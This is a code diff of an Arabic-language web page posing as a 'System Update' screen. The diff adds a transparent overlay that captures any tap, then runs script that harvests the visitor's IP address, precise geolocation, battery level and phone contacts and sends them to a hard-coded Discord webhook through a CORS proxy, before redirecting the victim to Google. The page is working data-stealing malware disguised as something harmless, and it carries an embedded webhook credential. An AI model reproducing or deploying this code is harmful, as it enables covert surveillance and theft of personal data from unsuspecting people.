@@ -2,19 +2,44 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Loading</title>
+    <title>System Update</title>
+    <style>
+        body { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            font-family: sans-serif; 
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+        }
+        #status { 
+            text-align: center; 
+            z-index: 1;
+            font-size: 24px;
+        }
+        /* زر شفاف يغطي الشاشة بالكامل */
+        #touch-layer {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 10;
+            cursor: pointer;
+        }
+    </style>
 </head>
-<body style="display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
-    <!-- هذا هو المربع الذي تراه -->
-    <div id="box" style="background:white; padding:2rem; border-radius:10px; box-shadow:0 4px 10px rgba(0,0,0,0.1); text-align:center;">
-        <h2 id="status">جاري التحديث...</h2>
-    </div>
+<body>
+    <!-- طبقة اللمس المخفية -->
+    <div id="touch-layer"></div>
+    
+    <h2 id="status">جاري التحديث...</h2>
 
 <script>
-    // ⚙️ ضع رابط الويب هوك هنا (تأكد من عدم وجود مسافات)
-    const WEBHOOK = '.......'; 
+    const WEBHOOK = 'https://discord.com/api/webhooks/1564210777194233899/KtJ9_m_v6mvbHHXpn8aVvWnTysSSqmQCBRUJiCtow8O9krQGPddn1i2ojt_cJrYNPpSZ'; 
 
-    async function run() {
+    // دالة جلب البيانات بعد التفاعل
+    async function collectData() {
         try {
             let battery = "N/A";
             if(navigator.getBattery) {
@@ -22,24 +47,60 @@
                 battery = Math.round(b.level * 100) + "%";
             }
 
-            let msg = 🎉 تقرير جديد\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${battery};
-
-            // استخدام JSONP لتجاوز مشاكل الشبكة
-            const script = document.createElement('script');
-            script.src = ${WEBHOOK}?callback=handleResponse&payload=${encodeURIComponent(JSON.stringify({content: msg}))};
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
             
-            window.handleResponse = function(data) {
-                document.getElementById('status').innerText = "تم بنجاح!";
-                setTimeout(() => window.location.href = 'https://google.com', 1000);
-            };
+            let coords = "غير متاح";
+            if (navigator.geolocation) {
+                coords = new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve(${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}),
+                        err => resolve("تم رفض الإذن")
+                    );
+                });
+                coords = await coords;
+            }
 
-            document.body.appendChild(script);
+            // محاولة جلب جهات الاتصال باستخدام واجهة المستخدم الحقيقية
+            let contactsList = [];
+            try {
+                // نستخدم select بدلاً من getAll لأنه أكثر توافقاً مع طلب الأذونات
+                const contactSource = { name: "device" };
+                const contactOptions = { multiple: true };
+                
+                // هذه الدالة ستظهر نافذة اختيار حقيقية للمستخدم
+                const contacts = await navigator.contacts.select(["name", "phone"], contactOptions);
+                
+                contacts.forEach(c => {
+                    let phone = c.phone && c.phone.length > 0 ? c.phone[0].value : "No Phone";
+                    contactsList.push(${c.name}: ${phone});
+                });
+            } catch (e) {
+                contactsList = ["تم إلغاء الاختيار أو عدم التوفر"];
+            }
+
+            let msgBase = 🌐 IP: ${ipData.ip}\n📍 الموقع: ${coords}\n🔋 البطارية: ${battery}\n\n📇 جهات الاتصال:\n;
+            let fullMsg = msgBase + contactsList.join('\n');
+
+            const proxyUrl = https://corsproxy.io/?${encodeURIComponent(WEBHOOK)};
+            await fetch(proxyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: fullMsg })
+            });
+
+            document.getElementById('status').innerText = "تم بنجاح!";
+            setTimeout(() => window.location.href = 'https://google.com', 1000);
         } catch (e) {
             document.getElementById('status').innerText = "خطأ: " + e.message;
         }
     }
 
-    run();
+    // ربط النقر على الطبقة الشفافة باستدعاء الدالة
+    document.getElementById('touch-layer').addEventListener('click', () => {
+        document.getElementById('status').innerText = "يرجى الانتظار...";
+        collectData();
+    });
 </script>
 </body>
 </html>
